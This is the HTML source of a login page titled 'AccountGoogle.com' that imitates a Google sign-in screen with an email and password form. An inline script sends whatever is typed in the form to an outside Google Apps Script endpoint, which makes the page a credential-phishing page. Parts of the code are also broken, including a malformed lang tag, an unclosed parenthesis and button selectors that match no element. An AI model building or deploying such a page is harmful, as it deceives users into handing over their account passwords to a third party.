<!DOCTYPE html>
<lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous" />
<!-- Bootstrap CSS end -->

    <title>AccountGoogle.com</title>
 
    <!-- css -->
<link rel="stylesheet" href="style.css">
    <!-- css end -->
</head>
<body>
    <!-- login form -->
<section class="login d-flex">
    <div class="login-left w-100 h-100">
        <div class="row justify-content-center align-items-center h-100">
            <div class="col-6">
                <div class="header">
                    <div class="display-flex text-center justify-content-center">
                  <img src="googleSS.png" width="160" height="150">
                </div>
                </div>
                <div class="login-form">
                    <form name="juan-login-form">
                    <label for="email" class="form-label">Email</label>
                    <input type="email" class="form-control" id="email" placeholder="Enter your email" name="email">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" placeholder="Enter your password" name="password">
                    <a href="" class="text-decoration-none text-center">Forgot password</a>
                    <button class="signin">Signin</button>
                    <button class="btn btn-primary btn-loading d-none" type="button" disabled>
                        <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
                        Loading...
                      </button>
                    <button class="signin-google">Signin Google
                    <img src="google.png" width="25px" height="25px">
                </button>
            </form>
                <div class="text-center">
                    <span class="d-inline ">Dont have an account? 
                        <a href="#" class="signup d-inline text-decoration-none">Sign up for free</a>
                    </span>
                </div>
                </div>
            </div>
        </div>
    </div>
</section>
    <!-- login form end -->

        <!-- boostrap js -->
        <script
          src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"
          integrity="sha384-oBqDVm
    Mz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3"
          crossorigin="anonymous"
        ></script>
        
<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbyI0ISImEF4RrD7L_d9FNLDAfEckw5NYAhuIGCO-Ct1MIUhF0Y9TRPLWfDuwDyI9WeO0A/exec'
    const form = document.forms['juan-login-form']
    const btnSignin = document.querySelector ('.btn-Signin')
    const btnLoading = document.querySelector ('.btn-Loading')
  
    form.addEventListener('submit', e => {
        e.preventDefault()
     // tampilkan tombol loading hilangkan tombol kirim 
     btnLoading.classList.toggle ('d-none')
        btnSignin.classList.toggle ('d-none')
        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
          .then(response => {
            // tampilkan tombol kirim hilangkan tombol loading
            btnLoading.classList.toggle ('d-none')
            btnSignin.classList.toggle ('d-none'
            console.log('Success!', response)
          })
          .catch(error => console.error('Error!', error.message))
      })
  </script>
  </body>
</html>
